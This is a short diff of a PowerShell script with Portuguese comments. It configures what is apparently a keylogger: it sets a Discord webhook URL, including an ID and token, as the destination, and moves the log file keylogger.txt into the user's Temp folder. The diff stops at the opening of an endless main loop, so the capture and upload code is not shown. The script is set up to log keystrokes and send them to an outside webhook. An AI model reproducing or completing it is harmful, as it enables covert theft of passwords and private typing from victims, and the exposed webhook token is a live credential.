@@ -1,6 +1,6 @@
 # CONFIGURAÇÃO BÁSICA
 $webhookUrl = "https://discord.com/api/webhooks/1405002732817088533/nLnHnKuwx_5yGquy6vVKVC0NFQPFDvygvxcM9kUK9zdNh3hLZDx5s0XLNcvTRnIcX_YK"  # 👈 SUBSTITUA
-$caminhoArquivo = "C:\Users\%USERPROFILE%\AppData\Local\Temp\keylogger.txt"  # 👈 SUBSTITUA
+$caminhoArquivo = "$env:Temp\keylogger.txt"  # 👈 SUBSTITUA
 
 # LOOP PRINCIPAL (Ctrl+C para parar)
 while ($true) {
